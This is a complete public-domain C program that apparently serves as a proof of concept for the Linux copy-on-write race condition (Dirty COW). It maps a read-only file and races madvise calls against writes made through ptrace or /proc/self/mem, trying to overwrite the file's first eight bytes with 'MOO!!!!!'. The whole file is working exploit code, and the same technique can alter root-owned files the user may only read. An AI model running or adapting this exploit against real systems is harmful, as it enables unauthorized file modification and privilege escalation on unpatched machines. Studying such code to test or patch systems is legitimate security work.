// This code is released by author to the public domain.

#include <fcntl.h>                                              
#include <pthread.h>                                            
#include <string.h>                                             
#include <stdio.h>                                              
#include <stdint.h>                                             
#include <sys/mman.h>                                           
#include <sys/types.h>                                          
#include <sys/wait.h>                                           
#include <sys/ptrace.h>                                         
#include <unistd.h>                                             
#include <stdlib.h>
#include <errno.h>

#define TRIES 250000
#define PERCENT (TRIES/100)

#define die(...) fprintf(stderr,__VA_ARGS__), exit(1)

// This runs as a thread, repeatedly MADV_DONTNEED's the specified memory map
// in order to trigger the race condition. 
static void *madvise_loop(void *map)
{   
    int i; 
    for (i = 0; i < 100*TRIES; i++) {
        pthread_testcancel();
        madvise(map, sizeof(long), MADV_DONTNEED);
    }    
    return NULL; // normally won't get here
}                                                               

static void ptrace_method(void *map)
{                                                               
    printf("Using the ptrace method\n");
    long moo=*(long *)(char []){"MOO!!!!!"};                // works for 32 or 64 bit
    
    pid_t pid = fork();                                               
    if (!pid)
    {
        // child 
        pthread_t t;
        pthread_create(&t, NULL, madvise_loop, map);        // start the thread  

        if (!ptrace(PTRACE_TRACEME))                        // if parent can ptrace us
            kill(getpid(), SIGSTOP);                        // then stop 

        pthread_cancel(t);                                  // stop thread on the way out
        return;
    } 

    // parent
    int x;
    waitpid(pid, &x, 0);                                    // wait for child to stop
    if (!WIFSTOPPED(x)) 
    {
        printf("Child did not stop\n");                     // done if it exited instead
        return;                                             // assume because ptrace is disabled, not an error
    }    
    
    printf("Running...");
    
    // parent, does the work
    for (x=0;; x++)                                  
    {
        if (*(long *)map == moo)                            // did our mmap change?
        {
            printf("\nSuccess after %d tries!\n",x);
            break;
        }    
            
        if (x >= TRIES)                                     // are we bored yet?
        {
            printf("\nGiving up after %d tries!\n",x);
            break;
        }    
    
        if (x % PERCENT == PERCENT-1) 
            putc('.',stdout), fflush(stdout);
            
        ptrace(PTRACE_POKETEXT, pid, map, moo);             // poke the child's mmap  
    } 
    
    ptrace(PTRACE_DETACH, pid, NULL, 0);                    // detach child so it can exit
}                                   

#define PSM "/proc/self/mem"
static void psm_method(void *map)
{
    printf("Using the "PSM" method\n");
    long moo=*(long *)(char []){"MOO!!!!!"};                // works for 32 or 64 bit
    
    int f=open(PSM, O_RDWR);
    if (f < 0) die("Can't open "PSM": %s\n", strerror(errno));
    
    pid_t pid = fork();                                               
    if (!pid)
    {
        // child, just spin until map is affected
        while (*(long *)map != moo) sched_yield();        
        return;
    }

    // parent
    pthread_t t;
    pthread_create(&t, NULL, madvise_loop, map);            // start the thread
    
    printf("Running...");
    
    int x;
    for (x=0;; x++)                                  
    {
        if (waitpid(pid, NULL, WNOHANG))                    // child died?
        {
            printf("\nSuccess after %d tries!\n",x);
            break;
        }    
        
        if (x >= TRIES)                                     // are we bored yet?
        {
            printf("\nGiving up after %d tries!\n",x);
            kill(pid, SIGTERM);                             // kill the child
            break;
        }    
            
        if (x % PERCENT == PERCENT-1) 
            putc('.',stdout), fflush(stdout);
        
        lseek(f, (off_t)map, SEEK_SET);                     // write map via /proc/self/mem
        write(f, &moo, sizeof(moo));
    }
    pthread_cancel(t);                                      // stop thread on the way out
}    

int main(int argc, char *argv[])
{  
    int f;
    void (*method)(void *);                                 // pointer to one of the methods above            
  
    if (argc == 2) 
        method=ptrace_method, f=open(argv[1], O_RDONLY); 
    else if (argc==3 && !strcmp(argv[1],"-p")) 
        method=psm_method, f=open(argv[2], O_RDONLY);
    else 
        die("Usage: moo [-p] file\n");
    if (f < 0) die("open failed: %s\n", strerror(errno));
    
    // mmap the file read-only but copy-on-write
    void *map = mmap(NULL, sizeof(long), PROT_READ, MAP_PRIVATE, f, 0);                                
    if (map == (void *)-1) die("mmap failed: %s\n", strerror(errno));

    method(map);                                            // now go break it
    return 0;
}
